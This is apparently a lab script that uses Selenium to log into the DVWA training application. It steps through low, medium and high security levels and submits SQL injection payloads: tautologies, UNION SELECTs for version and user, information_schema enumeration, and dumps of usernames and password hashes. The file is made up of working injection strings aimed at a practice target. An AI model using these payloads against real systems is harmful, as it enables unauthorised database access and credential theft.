from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import time
from selenium.webdriver.common.keys import Keys

def sqlinjection(host):
    timeToSleep=1
    #create a new Firefox session
    driver = webdriver.Firefox()
    driver.maximize_window()

    # navigate to the application home page
    driver.get("http://"+host+"/dvwa/login.php")

    # get the search textbox
    username = driver.find_element(By.NAME,"username")
    password = driver.find_element(By.NAME,"password")

    # enter search keyword and submit
    username.send_keys("admin")
    password.send_keys("password")
    login=driver.find_element(By.NAME,"Login")
    # login = driver.find_element(By., "submit")
    time.sleep(5)
    # elements.send_keys(Keys.ENTER)
    login.click()
    #
    driver.get("http://" + host + "/dvwa/security.php")
    searchele=driver.find_element(By.NAME,"security")
    s=Select(searchele)
    s.select_by_value("low")
    submit= driver.find_element(By.NAME,"seclev_submit")
    submit.click()
    time.sleep(5)

    driver.get("http://" + host + "/dvwa/setup.php")
    resetele=driver.find_element(By.NAME,"create_db")
    resetele.click()
    time.sleep(5)

    driver.get("http://" + host + "/dvwa/vulnerabilities/sqli/")
    inputElement = driver.find_element(By.NAME,"id")

    #low security
    inputElement.send_keys("1")
    time.sleep(timeToSleep)
    inputElement.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement1 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement1.send_keys("1 &' or 1=1#")
    time.sleep(1)
    inputElement1.send_keys(Keys.ENTER)
    time.sleep(10)


    inputElement2 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement2.send_keys("a' union select @@version,user()#")
    time.sleep(1)
    inputElement2.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement4 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement4.send_keys("a' union select table_name,null FROM information_schema.tables#")
    time.sleep(1)
    inputElement4.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement5 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement5.send_keys("a' union select table_name,null FROM information_schema.tables# WHERE table_schema=database()#")
    time.sleep(1)
    inputElement5.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement6 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement6.send_keys("a' union select column_name,null FROM information_schema.columns WHERE table_schema=database()#")
    time.sleep(1)
    inputElement6.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement7 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement7.send_keys("a' AND 1=0 UNION SELECT user,password FROM users #")
    time.sleep(1)
    inputElement7.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement8 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement8.send_keys("a' AND 1=0 UNION SELECT first_name,last_name FROM users #")
    time.sleep(1)
    inputElement8.send_keys(Keys.ENTER)
    time.sleep(10)

    #medium security
    driver.get("http://"+host + "/dvwa/security.php")
    searchele1=driver.find_element(By.NAME,"security")
    s1=Select(searchele1)
    s1.select_by_value("medium")
    submit1= driver.find_element(By.NAME,"seclev_submit")
    submit1.click()
    time.sleep(5)

    driver.get("http://"+host+"/dvwa/setup.php")
    resetele1=driver.find_element(By.NAME,"create_db")
    resetele1.click()
    time.sleep(5)

    driver.get("http://"+host+"/dvwa/vulnerabilities/sqli/")
    inputElement9 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement9.send_keys("1")
    time.sleep(1)
    inputElement9.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement10 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement10.send_keys("1 or 1=1 UNION SELECT user,password FROM users#")
    time.sleep(1)
    inputElement10.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement11 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement11.send_keys("1 or 1=1 UNION SELECT NULL,table_name from information_schema.tables#")
    time.sleep(1)
    inputElement11.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement12 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement12.send_keys("1 or 1=1 UNION SELECT NULL,column_name from information_schema.columns#")
    time.sleep(1)
    inputElement12.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement13 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement13.send_keys("1 or 1=1 UNION SELECT user,password from users#")
    time.sleep(1)
    inputElement13.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement14 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement14.send_keys("0 UNION SELECT user,password from dvwa.users")
    time.sleep(1)
    inputElement14.send_keys(Keys.ENTER)
    time.sleep(10)

    #high security
    driver.get("http://"+host + "/dvwa/security.php")
    searchele1=driver.find_element(By.NAME,"security")
    s1=Select(searchele1)
    s1.select_by_value("high")
    submit1= driver.find_element(By.NAME,"seclev_submit")
    submit1.click()
    time.sleep(5)

    driver.get("http://"+host+"/dvwa/setup.php")
    resetele1=driver.find_element(By.NAME,"create_db")
    resetele1.click()
    time.sleep(5)

    driver.get("http://" + host + "/dvwa/vulnerabilities/sqli/")
    inputElement15 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement15.send_keys("1' UNION SELECT user,password FROM users#")
    time.sleep(1)
    inputElement15.send_keys(Keys.ENTER)
    time.sleep(10)

    inputElement16 = driver.find_element(By.NAME, "id")
    time.sleep(1)
    inputElement16.send_keys("1' or 1=1 union select null,table_name from information_schema.tables#")
    time.sleep(1)
    inputElement16.send_keys(Keys.ENTER)
    time.sleep(10)